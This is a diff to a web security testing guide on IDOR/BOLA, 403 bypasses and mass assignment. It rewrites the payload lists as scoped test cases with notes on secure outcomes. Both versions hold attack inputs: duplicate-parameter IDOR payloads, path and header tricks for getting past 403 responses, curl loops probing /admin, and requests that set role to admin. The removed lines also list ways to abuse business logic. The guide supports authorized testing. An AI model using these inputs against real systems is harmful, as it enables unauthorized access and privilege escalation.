@@ -12,6 +12,9 @@ tags:
 
 # IDOR / BOLA, 403 Bypass & Race Conditions
 
+!!! note "What this page is doing"
+    Authorization testing needs a pair: a caller and an object the caller should not control. Compare roles, tenants, methods and state transitions, then use concurrency only when a normal sequential test cannot answer the question.
+
 ---
 
 ## 1. IDOR / BOLA Hunting Methodology
@@ -39,22 +42,30 @@ tags:
 
 === " Parameter Pollution & Format Confusion"
 
-    ```http
-    GET /api/v1/users/1337/profile HTTP/1.1
-    Host: <DOMAIN>
-    X-Original-User-Id: <YOUR_ID>
-    X-User-Id: <YOUR_ID>
-    # Duplicate parameters -> server picks first, authz middleware checks last
-    ?user_id=<YOUR_ID>&user_id=<VICTIM_ID>
-    ?user_id=<VICTIM_ID>&user_id=<YOUR_ID>
-    {"user_id": <YOUR_ID>, "user_id": <VICTIM_ID>} # JSON duplicate key
-    # Array / object confusion
-    {"user_id": [<YOUR_ID>, <VICTIM_ID>]}
-    {"user_id": {"id": <VICTIM_ID>}}
-    ?user_id[]=<VICTIM_ID>
-    # Wildcard / filter abuse
-    ?user_id=* | ?user_id=all | ?user_id= | ?user_id=null | ?user_id=0
-    ```
+First keep the request format valid, then change one representation at a time. The examples below are test cases, not a reason to send every variant to a production endpoint.
+
+```http
+GET /api/v1/users/<VICTIM_ID>/profile HTTP/1.1
+Host: <DOMAIN>
+Authorization: Bearer <TEST_TOKEN>
+X-Org-Id: <YOUR_ORG_ID>
+```
+
+```text
+# Duplicate query parameters: compare each order separately.
+?user_id=<YOUR_ID>&user_id=<VICTIM_ID>
+?user_id=<VICTIM_ID>&user_id=<YOUR_ID>
+
+# Array/object coercion: send one format per request.
+?user_id[]=<VICTIM_ID>
+{"user_id": ["<YOUR_ID>", "<VICTIM_ID>"]}
+{"user_id": {"id": "<VICTIM_ID>"}}
+
+# Wildcard and empty values: useful only when the endpoint supports filtering.
+user_id=*       | user_id=all       | user_id=       | user_id=null       | user_id=0
+```
+
+The secure result is consistent authorization for the object, regardless of representation. Record status, body fields, timing and side effects rather than treating a parser error as a bypass.
 
 ---
 
@@ -62,32 +73,45 @@ tags:
 
 When you hit `403 Forbidden` on `/admin` or an internal API, don't give up — try these systematically (inspired by HowToHunt's **403 Bypass**):
 
-```bash
-# Path-based obfuscation: the single most effective family
-/admin -> /admin/ -> //admin -> /admin//
-/admin -> /./admin -> /admin/. -> /admin%20
-/admin -> /admin%09 -> /admin%00 -> /admin..
-/admin -> /%2fadmin -> /admin%2f -> /admin;/
-/admin -> /Admin -> /ADMIN -> /aDmIn
-/admin -> /admin.json -> /admin.html -> /admin.php
-/admin -> /..;/admin -> /.;/admin -> /%252fadmin
-/api/v1/users -> /api/v1/Users -> /api/v1/users/. -> /api/v1/users%20
-# Header-based bypass (front-end allows, back-end trusts these)
+```text
+# Path representations to compare one at a time.
+/admin/        /admin//       /./admin       /admin%20
+/admin%09      /admin%00      /admin..        /%2fadmin
+/admin%2f      /admin;        /Admin          /ADMIN
+/admin.json    /admin.html    /admin.php      /..;/admin
+/api/v1/Users  /api/v1/users/. /api/v1/users%20
+
+# Headers to test only when the front-end/back-end trust boundary is in scope.
 X-Original-URL: /admin
 X-Rewrite-URL: /admin
 X-Forwarded-For: 127.0.0.1
-X-Forwarded-For: 127.0.0.1, 127.0.0.1
 X-Real-IP: 127.0.0.1
-X-Originating-IP: 127.0.0.1
-X-Remote-IP: 127.0.0.1
 X-Client-IP: 127.0.0.1
-X-Host: 127.0.0.1
-X-Custom-IP-Authorization: 127.0.0.1
 Referer: https://<DOMAIN>/admin
-# Method tampering (authz sometimes only bound to GET/POST handlers)
-curl -X POST / PUT / PATCH / DELETE / TRACE / OPTIONS / FOOBAR https://<DOMAIN>/admin
-# Content-type swap
-Content-Type: application/x-www-form-urlencoded -> application/json -> text/plain
+```
+
+```bash
+# Compare allowed HTTP methods without combining several methods into one
+# invalid curl invocation. Save only status and size for the first pass.
+for method in GET POST PUT PATCH DELETE OPTIONS; do
+  curl --silent --output /dev/null \
+    --write-out "$method %{http_code} %{size_download}\\n" \
+    --request "$method" \
+    "https://<DOMAIN>/admin"
+done
+
+# Compare content types only with a request body that the endpoint expects.
+for content_type in \\
+  'application/x-www-form-urlencoded' \\
+  'application/json' \\
+  'text/plain'; do
+  curl --silent --output /dev/null \\
+    --write-out "$content_type %{http_code}\\n" \\
+    --request POST \\
+    --header "Content-Type: $content_type" \\
+    --data '<APPROVED_TEST_BODY>' \\
+    "https://<DOMAIN>/admin"
+done
 ```
 
 ```bash
@@ -143,25 +167,49 @@ done
 
 ## 4. Business Logic & Mass Assignment
 
-```bash
-# Mass Assignment: add fields the app never displays in the UI
-POST /api/v1/register
-{"email":"a@b.com","password":"x","role":"admin","is_admin":true,"verified":true,
- "balance":1000000,"org_id":1,"subscription":"enterprise","is_staff":true}
-# PATCH-based privilege escalation
-PATCH /api/v1/users/me
-{"role":"superadmin","permissions":["*"]}
-# Try the classic property list on every object you touch
-# role, roles, admin, is_admin, isAdmin, user_type, account_type, plan, tier,
-# verified, email_verified, active, status, credits, balance, org_id, tenant_id,
-# permissions, scopes, group, groups, mfa_enabled, password_reset_required
-# Business logic classics
-- Negative quantity: {"qty":-1, "price":100} -> credit instead of debit
-- Currency confusion: pay in TRY, receive in USD
-- Decimal rounding: send 0.0001 units 10,000 times
-- Skip payment step entirely (multi-step checkout -> jump to /confirm)
-- Coupon stacking, self-referral, gift-card brute force (check rate limiting!)
-- Trial abuse: cancel -> re-register with +alias@email, or change email after trial
-- Refund abuse: refund to a different account than the purchaser
-- Feature flag flipping: ?beta=true, X-Feature-Flags: all
+Test one field or state transition at a time with a dedicated test account. The goal is to see whether the server ignores, rejects or applies a field the caller is not allowed to control.
+
+```http
+POST /api/v1/register HTTP/1.1
+Host: <DOMAIN>
+Authorization: Bearer <TEST_TOKEN>
+Content-Type: application/json
+
+{
+  "email": "<TEST_EMAIL>",
+  "password": "<TEST_PASSWORD>",
+  "role": "admin",
+  "is_admin": true,
+  "verified": true
+}
 ```
+
+```json
+{
+  "role": "superadmin",
+  "permissions": ["<APPROVED_TEST_PERMISSION>"],
+  "plan": "enterprise",
+  "tenant_id": "<TEST_TENANT_ID>"
+}
+```
+
+Keep a property wordlist for review, but do not submit every field blindly:
+
+```text
+role | roles | admin | is_admin | isAdmin | user_type | account_type
+plan | tier | verified | email_verified | active | status | credits
+balance | org_id | tenant_id | permissions | scopes | groups | mfa_enabled
+password_reset_required
+```
+
+Other state questions to model and test with harmless values:
+
+```text
+- Does a negative, zero or very large quantity change the price or balance?
+- Can a multi-step checkout, refund or approval step be skipped or replayed?
+- Can a coupon, trial, referral or seat limit be used more than once?
+- Does currency conversion or decimal rounding change the expected result?
+- Does changing a role or plan leave old privileges behind after downgrade?
+```
+
+A secure server rejects fields the caller does not control and enforces the state transition server-side. Document the before/after values and stop before creating real financial, account or data impact.
